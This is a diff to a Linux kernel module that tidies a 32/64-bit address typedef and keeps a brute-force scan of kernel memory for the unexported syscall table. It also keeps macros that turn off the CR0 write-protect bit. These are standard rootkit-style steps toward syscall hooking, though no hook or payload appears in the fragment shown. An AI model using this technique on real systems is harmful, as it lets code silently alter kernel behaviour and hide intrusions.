@@ -22,56 +22,21 @@ MODULE_LICENSE("GPL");
 #ifdef __i386__
 #define START_MEM   0xc0000000 //32bit kernel space
 #define END_MEM     0xd0000000
+typedef unsigned int address;
 #else
 #define START_MEM	0xffffffff81000000 //64bit kernel space
 #define END_MEM		0xffffffffa2000000
+typedef unsigned long long int address;
 #endif
 
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000)) //enables memory writing by changing a register somewhere
 #define GPF_ENABLE write_cr0(read_cr0() | 0x10000)      //read somewhere it's terrible practice
 
-#ifdef __i386__
-typedef unsigned int address; //allows for easier 32/64bit builds
-#else
-typedef unsigned long long int address;
-#endif
-
-/*#ifdef __i386__
-unsigned int *syscall_table; 
-
-unsigned int **find(void) { //finds the syscall table, not exported as of 2.6 (32bit)
-    unsigned int **sctable;
-    unsigned int i = START_MEM;
-    while ( i < END_MEM) { //essentially brute force
-        sctable = (unsigned int **)i;
-        if ( sctable[__NR_close] == (unsigned int *) sys_close) {
-            return &sctable[0];
-        }   
-        i += sizeof(void *);
-    }
-    return NULL;
-}
-#else
-unsigned long long *syscall_table;
- 
-unsigned long long  **find(void) { //same as above but 64bit
-	unsigned long long **sctable;
-	unsigned long long int i = START_MEM;
-	while ( i < END_MEM) { //essentially brute force
-		sctable = (unsigned long long **)i;
-		if ( sctable[__NR_close] == (unsigned long long *) sys_close) {
-			return &sctable[0];
-		}	
-		i += sizeof(void *);
-	}
-	return NULL;
-}
-#endif*/
-address *syscall_table;
-address **find(void) {
+address *syscall_table; //address typedef from above for 32/64 compat
+address **find(void) { //finds syscall table
     address **sctable;
     address i = START_MEM;
-    while ( i < END_MEM ) {
+    while ( i < END_MEM ) { //bruteforce through address space
         sctable = (address **)i;
         if ( sctable[__NR_close] == (address *) sys_close) {
             return &sctable[0];
